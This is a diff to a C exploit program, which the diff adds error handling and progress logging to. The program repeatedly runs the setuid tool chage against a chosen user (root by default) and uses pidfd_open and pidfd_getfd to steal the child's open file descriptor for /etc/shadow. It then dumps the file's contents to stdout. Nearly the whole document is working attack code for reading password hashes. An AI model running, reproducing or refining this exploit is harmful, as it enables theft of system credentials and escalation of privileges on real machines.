@@ -26,20 +26,55 @@
 #define __NR_pidfd_getfd 438
 #endif
 
+static void report_wait_status(const char *label, pid_t pid, int status)
+{
+	if (WIFEXITED(status))
+		fprintf(stderr, "%s pid=%d exited status=%d\n", label, pid, WEXITSTATUS(status));
+	else if (WIFSIGNALED(status))
+		fprintf(stderr, "%s pid=%d killed by signal %d\n", label, pid, WTERMSIG(status));
+	else if (WIFSTOPPED(status))
+		fprintf(stderr, "%s pid=%d stopped by signal %d\n", label, pid, WSTOPSIG(status));
+}
+
 int main(int argc, char **argv)
 {
 	const char *user = argc > 1 ? argv[1] : "root";
+	fprintf(stderr, "uid=%d target=/usr/bin/chage user=%s\n", getuid(), user);
 
 	for (int round = 0; round < 500; round++) {
+		fprintf(stderr, "[round %d] forking chage -l %s\n", round, user);
 		pid_t c = fork();
+		if (c < 0) {
+			perror("fork");
+			return 1;
+		}
 		if (c == 0) {
 			int dn = open("/dev/null", O_RDWR);
-			dup2(dn, 1); dup2(dn, 2);
+			if (dn < 0) {
+				perror("open /dev/null");
+				_exit(126);
+			}
+			if (dup2(dn, 1) < 0 || dup2(dn, 2) < 0) {
+				perror("dup2 /dev/null");
+				_exit(126);
+			}
+			if (dn > 2 && close(dn) < 0)
+				perror("close /dev/null");
 			execl("/usr/bin/chage", "chage", "-l", user, (char *)NULL);
+			perror("execl /usr/bin/chage");
 			_exit(127);
 		}
 		int pfd = syscall(__NR_pidfd_open, c, 0);
-		if (pfd < 0) { waitpid(c, NULL, 0); continue; }
+		if (pfd < 0) {
+			perror("pidfd_open");
+			int status;
+			if (waitpid(c, &status, 0) < 0)
+				perror("waitpid");
+			else
+				report_wait_status("child", c, status);
+			continue;
+		}
+		fprintf(stderr, "[round %d] pidfd_open ok pfd=%d child_pid=%d\n", round, pfd, c);
 
 		int got = -1;
 		for (int a = 0; a < 30000 && got < 0; a++) {
@@ -49,29 +84,58 @@ int main(int argc, char **argv)
 				char p[256] = {0}, lk[64];
 				snprintf(lk, sizeof(lk), "/proc/self/fd/%d", s);
 				ssize_t n = readlink(lk, p, sizeof(p) - 1);
+				if (n < 0) {
+					perror("readlink");
+					close(s);
+					continue;
+				}
 				if (n > 0) p[n] = 0;
 				if (strstr(p, "/etc/shadow")) {
 					fprintf(stderr, "fd %d -> %s (round=%d try=%d)\n", i, p, round, a);
 					got = s;
 					break;
 				}
-				close(s);
+				if (close(s) < 0)
+					perror("close stolen fd");
 			}
 		}
 
 		if (got >= 0) {
 			char buf[8192];
-			lseek(got, 0, SEEK_SET);
+			if (lseek(got, 0, SEEK_SET) < 0)
+				perror("lseek");
 			ssize_t n;
-			while ((n = read(got, buf, sizeof(buf))) > 0)
-				fwrite(buf, 1, n, stdout);
-			close(got);
-			close(pfd);
-			waitpid(c, NULL, 0);
+			ssize_t total = 0;
+			while ((n = read(got, buf, sizeof(buf))) > 0) {
+				total += n;
+				if (fwrite(buf, 1, n, stdout) != (size_t)n) {
+					perror("fwrite");
+					break;
+				}
+			}
+			if (n < 0)
+				perror("read");
+			else
+				fprintf(stderr, "read %zd bytes total from /etc/shadow\n", total);
+			if (close(got) < 0)
+				perror("close matched fd");
+			if (close(pfd) < 0)
+				perror("close pidfd");
+			int status;
+			if (waitpid(c, &status, 0) < 0)
+				perror("waitpid");
+			else
+				report_wait_status("child", c, status);
 			return 0;
 		}
-		close(pfd);
-		waitpid(c, NULL, 0);
+		fprintf(stderr, "[round %d] exhausted 30000 attempts without a match\n", round);
+		if (close(pfd) < 0)
+			perror("close pidfd");
+		int status;
+		if (waitpid(c, &status, 0) < 0)
+			perror("waitpid");
+		else
+			report_wait_status("child", c, status);
 	}
 	fprintf(stderr, "no hit in 500 rounds\n");
 	return 1;
